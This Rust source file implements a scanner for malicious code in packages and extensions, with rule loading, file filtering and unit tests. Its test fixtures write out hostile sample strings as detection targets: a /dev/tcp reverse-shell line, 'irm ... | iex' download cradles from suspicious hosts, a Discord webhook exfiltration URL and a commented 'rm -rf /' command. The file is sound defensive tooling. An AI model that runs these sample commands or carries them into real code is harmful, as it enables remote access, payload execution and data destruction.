use crate::RuleMatch;
use regex::Regex;
use std::path::Path;
use walkdir::WalkDir;

/// Human-readable ruleset version (also surfaced by `kalascan rules`).
pub const RULESET_VERSION: &str = "2026.10";

/// Critical file extensions for scanning
const CRITICAL_EXTENSIONS: &[&str] = &[
    ".py", ".js", ".ts", ".mjs", ".cjs", ".sh", ".bat", ".ps1", ".vbs", ".php", ".java", ".kt",
];

/// Critical filenames (exact match)
// `extension.vsixmanifest` carries the marketplace links; malicious
// extensions point them at raw-IP C2 hosts.
const CRITICAL_FILENAMES: &[&str] = &[
    "package.json",
    "setup.py",
    "manifest.json",
    "plugin.xml",
    "extension.vsixmanifest",
];

/// Prose files: never executed, and READMEs routinely quote IOC strings that
/// trip YARA. Skipped for the YARA-only pass on non-script files.
const DOC_EXTENSIONS: &[&str] = &[".md", ".markdown", ".rst", ".txt", ".adoc"];

/// Per-file read cap. Larger files are scanned up to this size and flagged,
/// never skipped: padding a payload past the cap used to hide it entirely.
const MAX_SCAN_BYTES: u64 = 4 * 1024 * 1024;

/// Finding name for critical files larger than `MAX_SCAN_BYTES`.
pub const OVERSIZED_FINDING: &str = "Oversized File (partially scanned)";

/// Rule names the correlation pass keys on (see `correlate.rs`).
pub const LOCAL_SERVER: &str = "Local Network Server";
pub const UPLOAD_HANDLER: &str = "HTTP File Upload Handler";
pub const ARCHIVE_EXTRACTION: &str = "Archive Extraction";
pub const EXFIL_SERVICE: &str = "Exfiltration Service Endpoint";
pub const IP_URL: &str = "Public IP URL";
pub const IP_LOOKUP: &str = "IP Lookup Service";
pub const HOST_RECON: &str = "Host Reconnaissance";
pub const REMOTE_BINARY: &str = "Remote Executable Download";
pub const SHELL_START: &str = "Shell Process Start";
pub const RAW_SOCKET: &str = "Raw Socket Connection";
pub const DETACHED_SPAWN: &str = "Detached Process Spawn";
pub const MAKE_EXECUTABLE: &str = "Make File Executable";
pub const OBFUSCATOR_IO: &str = "Obfuscator.io Output";
pub const SEED_ACCESS: &str = "Wallet Seed / Private Key Handling";
pub const INSTALL_HOOK_OVERRIDE: &str = "setup.py Install Hook Override";
pub const SETUP_PY_EXEC: &str = "setup.py Install-time Execution";
pub const SETUP_PY_STAGER: &str = "setup.py Payload Decode/Fetch";
pub const DOWNLOAD_CRADLE: &str = "Download Cradle (fetch piped to interpreter)";

#[derive(Clone, Debug)]
pub struct Rule {
    pub id: String,
    pub name: String,
    pub pattern: Regex,
    pub severity: String,
    pub description: String,
    pub category: String,
    /// File names this rule never runs on (e.g. npm metadata in package.json).
    pub exclude_files: Vec<String>,
}

#[derive(serde::Deserialize)]
struct RuleFile {
    rule: Vec<RuleDef>,
}

#[derive(serde::Deserialize)]
struct RuleDef {
    id: String,
    name: String,
    severity: String,
    category: String,
    description: String,
    pattern: String,
    #[serde(default)]
    matches: Vec<String>,
    #[serde(default)]
    ignores: Vec<String>,
    #[serde(default)]
    exclude_files: Vec<String>,
}

const SEVERITIES: &[&str] = &["critical", "high", "medium", "low"];

/// Parse a rules TOML file (built-in or `--rules <file>`). Every rule must
/// compile and agree with its own examples, so a broken custom rule fails
/// the scan up front instead of silently matching nothing.
pub fn parse_rules(toml_text: &str) -> anyhow::Result<Vec<Rule>> {
    let file: RuleFile = toml::from_str(toml_text)?;
    file.rule
        .into_iter()
        .map(|d| {
            if !SEVERITIES.contains(&d.severity.as_str()) {
                anyhow::bail!("rule {}: unknown severity '{}'", d.id, d.severity);
            }
            let pattern = Regex::new(&d.pattern)
                .map_err(|e| anyhow::anyhow!("rule {} ({}): {}", d.id, d.name, e))?;
            if let Some(m) = d.matches.iter().find(|m| !pattern.is_match(m)) {
                anyhow::bail!(
                    "rule {} ({}) does not match its example {:?}",
                    d.id,
                    d.name,
                    m
                );
            }
            if let Some(i) = d.ignores.iter().find(|i| pattern.is_match(i)) {
                anyhow::bail!(
                    "rule {} ({}) matches its ignore example {:?}",
                    d.id,
                    d.name,
                    i
                );
            }
            Ok(Rule {
                id: d.id,
                name: d.name,
                pattern,
                severity: d.severity,
                description: d.description,
                category: d.category,
                exclude_files: d.exclude_files,
            })
        })
        .collect()
}

pub fn load_rules_file(path: &Path) -> anyhow::Result<Vec<Rule>> {
    let text = std::fs::read_to_string(path)
        .map_err(|e| anyhow::anyhow!("cannot read rules file {}: {}", path.display(), e))?;
    parse_rules(&text).map_err(|e| anyhow::anyhow!("{}: {}", path.display(), e))
}

static BUILTIN_RULES: std::sync::LazyLock<Vec<Rule>> = std::sync::LazyLock::new(|| {
    parse_rules(include_str!("../rules/builtin.toml")).expect("rules/builtin.toml is valid")
});

impl Rule {
    pub fn applies_to(&self, ext: &str, filename: &str) -> bool {
        if self.exclude_files.iter().any(|f| f == filename) {
            return false;
        }
        if self.category == "obfuscation" {
            return true;
        }
        if self.category == "exfiltration" {
            return CRITICAL_EXTENSIONS.contains(&ext) || CRITICAL_FILENAMES.contains(&filename);
        }
        if self.category == "file_access" {
            return CRITICAL_EXTENSIONS.contains(&ext);
        }
        // Code in setup.py runs at `pip install` time; elsewhere these calls are ordinary.
        if self.category == "install_hook" {
            return filename == "setup.py";
        }
        true
    }
}

/// Built-in rules from `rules/builtin.toml`, parsed and compiled once.
pub fn build_rules() -> Vec<Rule> {
    BUILTIN_RULES.clone()
}

pub fn is_critical_file(filename: &str) -> bool {
    let lower = filename.to_lowercase();
    if CRITICAL_FILENAMES.contains(&lower.as_str()) {
        return true;
    }
    CRITICAL_EXTENSIONS.iter().any(|ext| lower.ends_with(ext))
}

pub fn get_extension(filename: &str) -> &str {
    let lower = filename.to_lowercase();
    for ext in CRITICAL_EXTENSIONS {
        if lower.ends_with(ext) {
            return ext;
        }
    }
    ""
}

/// Scan directory, optionally restricted to `changed` repo-relative paths
/// (used by `--changed-only` for PR scans).
pub fn scan_directory_filtered<P: AsRef<Path>>(
    dir: P,
    custom_yara_dir: Option<&Path>,
    extra_rules: &[Rule],
    changed: Option<&std::collections::HashSet<std::path::PathBuf>>,
) -> (usize, usize, Vec<RuleMatch>) {
    let mut rules = build_rules();
    rules.extend_from_slice(extra_rules);
    let yara_engine = crate::yara_engine::YaraEngine::new(custom_yara_dir);
    let mut matches = Vec::new();
    let mut total_files = 0usize;
    let mut targets: Vec<Target> = Vec::new();
    let mut scanned_files = 0usize;

    // `node_modules` is scanned: in a VSIX/CRX it is shipped, executed code
    // and the obvious place to hide a payload.
    let skip_dirs: &[&str] = &[
        ".git",
        "__pycache__",
        ".tox",
        ".eggs",
        "target",
        "venv",
        ".venv",
    ];

    // Phase 1: collect candidate files (same order as the old single pass,
    // so results stay deterministic).
    for entry in WalkDir::new(dir.as_ref()).into_iter().filter_entry(|e| {
        let name = e.file_name().to_string_lossy();
        !e.path().is_dir() || !skip_dirs.contains(&name.as_ref())
    }) {
        let entry = match entry {
            Ok(e) => e,
            Err(_) => continue,
        };

        if !entry.file_type().is_file() {
            continue;
        }

        total_files += 1;

        let filename = entry.file_name().to_string_lossy().to_string();
        let critical = is_critical_file(&filename);
        let lower = filename.to_lowercase();
        if !critical && DOC_EXTENSIONS.iter().any(|ext| lower.ends_with(ext)) {
            continue;
        }

        let rel_path = entry
            .path()
            .strip_prefix(dir.as_ref())
            .unwrap_or(entry.path())
            .to_string_lossy()
            .to_string();

        // `--changed-only` filter: skip files not in the changed set
        if let Some(changed) = changed {
            if !changed.contains(std::path::Path::new(&rel_path)) {
                continue;
            }
        }

        scanned_files += critical as usize;
        targets.push(Target {
            rel_path,
            filename,
            abs_path: entry.path().to_path_buf(),
            critical,
        });
    }

    // Phase 2: scan candidate files in parallel (chunks preserve order,
    // so concatenating the chunk results equals the sequential output).
    let workers = std::thread::available_parallelism()
        .map(|n| n.get())
        .unwrap_or(4)
        .min(16);
    let chunk_size = targets.len().div_ceil(workers).max(1);
    std::thread::scope(|scope| {
        let handles: Vec<_> = targets
            .chunks(chunk_size)
            .map(|chunk| scope.spawn(|| scan_files(chunk, &rules, &yara_engine)))
            .collect();
        for handle in handles {
            matches.extend(handle.join().unwrap_or_default());
        }
    });

    (total_files, scanned_files, matches)
}

struct Target {
    rel_path: String,
    filename: String,
    abs_path: std::path::PathBuf,
    /// Script/manifest file: gets RegEx + entropy rules. Every file gets YARA.
    critical: bool,
}

/// Read at most `MAX_SCAN_BYTES`, returning the bytes and the real file size.
fn read_capped(path: &Path) -> Option<(Vec<u8>, u64)> {
    use std::io::Read;
    let file = std::fs::File::open(path).ok()?;
    let size = file.metadata().ok()?.len();
    let mut buf = Vec::new();
    file.take(MAX_SCAN_BYTES).read_to_end(&mut buf).ok()?;
    Some((buf, size))
}

/// Scan one chunk of targets.
fn scan_files(
    targets: &[Target],
    rules: &[Rule],
    yara_engine: &crate::yara_engine::YaraEngine,
) -> Vec<RuleMatch> {
    let mut matches = Vec::new();
    for Target {
        rel_path,
        filename,
        abs_path,
        critical,
    } in targets
    {
        let Some((bytes, size)) = read_capped(abs_path) else {
            continue;
        };

        if !critical {
            matches.extend(yara_engine.scan_data(rel_path, &bytes));
            if crate::workflow::is_workflow(rel_path) {
                matches.extend(crate::workflow::scan(
                    rel_path,
                    &String::from_utf8_lossy(&bytes),
                ));
            }
            continue;
        }

        // Lossy: one invalid byte used to make read_to_string fail and skip the file.
        let content = String::from_utf8_lossy(&bytes);

        // Whole-file inline suppression marker
        if content.contains("kalascan:ignore-file") {
            continue;
        }

        if size > MAX_SCAN_BYTES {
            matches.push(RuleMatch {
                file_path: rel_path.clone(),
                line_number: 1,
                matched_pattern: OVERSIZED_FINDING.to_string(),
                severity: "low".to_string(),
                context: format!(
                    "File is {} bytes; only the first {} MiB were scanned",
                    size,
                    MAX_SCAN_BYTES / (1024 * 1024)
                ),
            });
        }

        let file_start = matches.len();
        // Byte offset per finding of this file, for chain proximity checks.
        let mut offsets: Vec<usize> = Vec::new();
        let newlines: Vec<usize> = content.match_indices('\n').map(|(i, _)| i).collect();
        let ext = get_extension(filename);

        for rule in rules {
            if !rule.applies_to(ext, filename) {
                continue;
            }

            for cap in rule.pattern.find_iter(&content) {
                if line_has_ignore_marker(&content, cap.start())
                    || is_comment_only_line(&content, cap.start())
                {
                    continue;
                }
                let is_ip_rule = rule.name == "Hardcoded IP Address" || rule.name == IP_URL;
                let ip_text = cap.as_str().rsplit('/').next().unwrap_or_default();
                if is_ip_rule && !is_public_ipv4(ip_text) {
                    continue;
                }
                let is_download_rule = rule.name == REMOTE_BINARY || rule.name == DOWNLOAD_CRADLE;
                if is_download_rule && is_vendor_download(cap.as_str()) {
                    continue;
                }
                let context = get_context(&content, cap.start(), cap.end());
                offsets.push(cap.start());

                matches.push(RuleMatch {
                    file_path: rel_path.clone(),
                    line_number: newlines.partition_point(|&i| i < cap.start()) + 1,
                    matched_pattern: rule.name.to_string(),
                    severity: rule.severity.to_string(),
                    context,
                });
            }
        }

        // Advanced entropy, invisible zero-width, Trojan Source, homoglyphs.
        // Guarded: a panic here must not drop the other files in this chunk
        // (a UTF-8 slicing bug used to do exactly that).
        let entropy_matches = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
            crate::entropy::scan_advanced_obfuscation(rel_path, &content)
        }))
        .unwrap_or_default();
        matches.extend(entropy_matches);

        // YARA rules matching
        let yara_matches = yara_engine.scan_data(rel_path, content.as_bytes());
        matches.extend(yara_matches);

        // Entropy / YARA hits only know their line: use the line start.
        let line_start = |line: usize| match line {
            0 | 1 => 0,
            n => newlines.get(n - 2).map_or(0, |&i| i + 1),
        };
        for m in &matches[file_start + offsets.len()..] {
            offsets.push(line_start(m.line_number));
        }
        let chains =
            crate::correlate::correlate_file(rel_path, &content, &matches[file_start..], &offsets);
        matches.extend(chains);
    }
    matches
}

/// Official vendor download / installer hosts: Playwright fetching Chrome
/// from dl.google.com, the Python extension running astral.sh's uv
/// installer. Not GitHub, Drive or OneDrive: attackers host payloads there.
fn is_vendor_download(url: &str) -> bool {
    const VENDORS: &[&str] = &[
        "dl.google.com",
        "astral.sh",
        "sh.rustup.rs",
        "get.docker.com",
        "deno.land",
        "bun.sh",
        "install.python-poetry.org",
        "get.pnpm.io",
        "pyenv.run",
        "microsoft.com",
        "aka.ms",
        "visualstudio.com",
        "nodejs.org",
        "python.org",
        "mozilla.org",
        "mozilla.net",
        "docker.com",
        "playwright.dev",
        "apple.com",
    ];
    let Some(host) = url
        .split("://")
        .nth(1)
        .and_then(|rest| rest.split(['/', ':', '?']).next())
    else {
        return false;
    };
    let host = host.to_ascii_lowercase();
    VENDORS
        .iter()
        .any(|v| host == *v || host.ends_with(&format!(".{}", v)))
}

/// Loopback, private, link-local and version-like invalid quads are not C2.
fn is_public_ipv4(text: &str) -> bool {
    match text.parse::<std::net::Ipv4Addr>() {
        Ok(ip) => {
            !(ip.is_loopback()
                || ip.is_private()
                || ip.is_link_local()
                || ip.is_unspecified()
                || ip.is_broadcast()
                || ip.is_documentation())
        }
        Err(_) => false,
    }
}

fn line_has_ignore_marker(content: &str, start: usize) -> bool {
    let line_start = content[..start].rfind('\n').map(|i| i + 1).unwrap_or(0);
    let line_end = content[start..]
        .find('\n')
        .map(|i| start + i)
        .unwrap_or(content.len());
    content[line_start..line_end].contains("kalascan:ignore")
}

/// True when the match sits inside a comment (`//`, `#`, `/* ... */`).
/// Commented-out code is not executed; flagging it was pure noise.
fn is_comment_only_line(content: &str, start: usize) -> bool {
    let line_start = content[..start].rfind('\n').map(|i| i + 1).unwrap_or(0);
    let before = &content[line_start..start];
    let trimmed = before.trim_start();
    if trimmed.starts_with("//") || trimmed.starts_with('#') {
        return true;
    }
    match (before.rfind("/*"), before.rfind("*/")) {
        (Some(open), Some(close)) => open > close,
        (Some(_), None) => true,
        _ => false,
    }
}

fn get_context(content: &str, start: usize, end: usize) -> String {
    let before = content[..start]
        .rsplit('\n')
        .take(3)
        .collect::<Vec<_>>()
        .into_iter()
        .rev()
        .collect::<Vec<_>>()
        .join("\n");

    let matched = &content[start..end];
    let after = content[end..]
        .split('\n')
        .take(3)
        .collect::<Vec<_>>()
        .join("\n");

    let mut ctx = format!("{}\n>>> {} <<<\n{}", before, matched, after);
    if ctx.len() > 200 {
        ctx = format!("{}...", &ctx[..200]);
    }
    ctx
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_scan_directory_filtered_parallel_is_deterministic() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("a.py"),
            "discord.com/api/webhooks/123456789012345678/ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrst\n",
        )
        .unwrap();
        std::fs::write(dir.path().join("b.py"), "eval('x')\n").unwrap();

        let (total, scanned, mut first) = scan_directory_filtered(dir.path(), None, &[], None);
        let (_, _, mut second) = scan_directory_filtered(dir.path(), None, &[], None);

        let key = |m: &RuleMatch| {
            (
                m.file_path.clone(),
                m.line_number,
                m.matched_pattern.clone(),
            )
        };
        first.sort_by_key(key);
        second.sort_by_key(key);
        assert_eq!(first, second);
        assert_eq!(total, 2);
        assert_eq!(scanned, 2);
        assert!(!first.is_empty());
    }

    #[test]
    fn test_evasion_tricks_no_longer_hide_files() {
        let dir = tempfile::tempdir().unwrap();
        // Invalid UTF-8 byte used to make the whole file unreadable.
        let mut bad_utf8 = b"\xff\xfe\n".to_vec();
        bad_utf8.extend_from_slice(b"eval(payload)\n");
        std::fs::write(dir.path().join("a.js"), bad_utf8).unwrap();
        // Padding past the old 1 MiB cap used to skip the file entirely.
        let mut padded = "eval(payload)\n".to_string();
        padded.push_str(&" ".repeat(MAX_SCAN_BYTES as usize));
        std::fs::write(dir.path().join("b.js"), padded).unwrap();
        // Non-script file: only YARA applies, it used to be skipped.
        std::fs::write(
            dir.path().join("payload.bin"),
            b"\x7fELF\x00/bin/sh -i >& /dev/tcp/10.0.0.1/4444\x00",
        )
        .unwrap();
        // Docs quoting IOCs are not payloads.
        std::fs::write(
            dir.path().join("README.md"),
            "Detects `/bin/sh -i >& /dev/tcp/` reverse shells\n",
        )
        .unwrap();

        let (total, scanned, matches) = scan_directory_filtered(dir.path(), None, &[], None);
        assert_eq!((total, scanned), (4, 2));
        assert!(!matches.iter().any(|m| m.file_path == "README.md"));
        let has = |file: &str, rule: &str| {
            matches
                .iter()
                .any(|m| m.file_path == file && m.matched_pattern == rule)
        };
        assert!(has("a.js", "eval() Usage"));
        assert!(matches
            .iter()
            .any(|m| m.file_path == "a.js" && m.line_number == 2));
        assert!(has("b.js", "eval() Usage"));
        assert!(has("b.js", OVERSIZED_FINDING));
        assert!(has("payload.bin", "YARA Rule: ReverseShellGeneric"));
    }

    /// Rule examples (`matches` / `ignores` in rules/builtin.toml) are
    /// checked by `parse_rules`; this also pins ids, names and the names
    /// correlate.rs keys on.
    #[test]
    fn test_builtin_rules_load_and_are_consistent() {
        let rules = parse_rules(include_str!("../rules/builtin.toml")).unwrap();
        let ids: std::collections::HashSet<_> = rules.iter().map(|r| r.id.as_str()).collect();
        let names: std::collections::HashSet<_> = rules.iter().map(|r| r.name.as_str()).collect();
        assert_eq!(ids.len(), rules.len(), "duplicate rule id");
        assert_eq!(names.len(), rules.len(), "duplicate rule name");
        for name in [
            LOCAL_SERVER,
            UPLOAD_HANDLER,
            ARCHIVE_EXTRACTION,
            EXFIL_SERVICE,
            IP_URL,
            IP_LOOKUP,
            HOST_RECON,
            REMOTE_BINARY,
            SHELL_START,
            RAW_SOCKET,
            DETACHED_SPAWN,
            MAKE_EXECUTABLE,
            OBFUSCATOR_IO,
            SEED_ACCESS,
            INSTALL_HOOK_OVERRIDE,
            SETUP_PY_EXEC,
            SETUP_PY_STAGER,
            DOWNLOAD_CRADLE,
            "Hardcoded IP Address",
            "Post-Install Script",
            "URL Fetch Command",
        ] {
            assert!(
                names.contains(name),
                "correlation keys on missing rule {:?}",
                name
            );
        }
        let known = [
            "exfiltration",
            "file_access",
            "obfuscation",
            "ransomware",
            "supply_chain",
            "network",
            "file_write",
            "recon",
            "install_hook",
        ];
        for r in &rules {
            assert!(
                known.contains(&r.category.as_str()),
                "{}: category {}",
                r.id,
                r.category
            );
        }
    }

    #[test]
    fn test_custom_rules_are_validated() {
        let ok = "[[rule]]\nid='X-1'\nname='Evil Host'\nseverity='high'\ncategory='exfiltration'\n\
                  description='d'\npattern='evil\\.example'\nmatches=['https://evil.example/x']";
        assert_eq!(parse_rules(ok).unwrap()[0].name, "Evil Host");
        let bad_example = ok.replace("evil.example/x", "good.example/x");
        assert!(parse_rules(&bad_example)
            .unwrap_err()
            .to_string()
            .contains("does not match"));
        let bad_regex = ok.replace("evil\\.example", "evil(");
        assert!(parse_rules(&bad_regex).is_err());
        let bad_severity = ok.replace("'high'", "'urgent'");
        assert!(parse_rules(&bad_severity).is_err());
    }

    #[test]
    fn test_vendor_download_hosts() {
        assert!(is_vendor_download(
            "https://dl.google.com/chrome/install/ChromeStandaloneSetup64.exe"
        ));
        assert!(is_vendor_download("https://download.microsoft.com/a/b.msi"));
        assert!(!is_vendor_download(
            "https://drive.google.com/uc?id=x&export=download.exe"
        ));
        assert!(!is_vendor_download(
            "https://raw.githubusercontent.com/u/r/main/run.ps1"
        ));
        assert!(!is_vendor_download("http://paxfallow.ru/Lightshot.exe"));
        assert!(!is_vendor_download("http://microsoft.com.evil.ru/a.exe"));
        assert!(is_vendor_download(
            "irm https://astral.sh/uv/install.ps1 | iex"
        ));
        assert!(!is_vendor_download("irm https://niggboo.com/aaa | iex"));
    }

    #[test]
    fn test_public_ipv4_filter() {
        assert!(!is_public_ipv4("127.0.0.1"));
        assert!(!is_public_ipv4("192.168.1.10"));
        assert!(!is_public_ipv4("1.2.300.4"));
        assert!(is_public_ipv4("45.9.148.3"));
    }

    #[test]
    fn test_exec_match_stays_on_its_line() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("a.py"), "x = 1\nexec(code)\n").unwrap();
        let (_, _, matches) = scan_directory_filtered(dir.path(), None, &[], None);
        let m = matches
            .iter()
            .find(|m| m.matched_pattern == "exec() Usage")
            .unwrap();
        assert_eq!(m.line_number, 2);
    }

    #[test]
    fn test_is_critical_file() {
        assert!(is_critical_file("script.py"));
        assert!(is_critical_file("script.js"));
        assert!(is_critical_file("batch.bat"));
        assert!(is_critical_file("package.json"));
        assert!(!is_critical_file("readme.md"));
        assert!(!is_critical_file("image.png"));
    }

    #[test]
    fn test_commented_out_code_is_ignored() {
        let content = "// exec(command, { name: \"X\" }, (err) => {});\n";
        assert!(is_comment_only_line(content, 5)); // inside the comment
        let real = "exec(command, { name: \"X\" }, (err) => {});\n";
        assert!(!is_comment_only_line(real, 3));
        let py = "# os.system('rm -rf /')\n";
        assert!(is_comment_only_line(py, 4));
    }
}
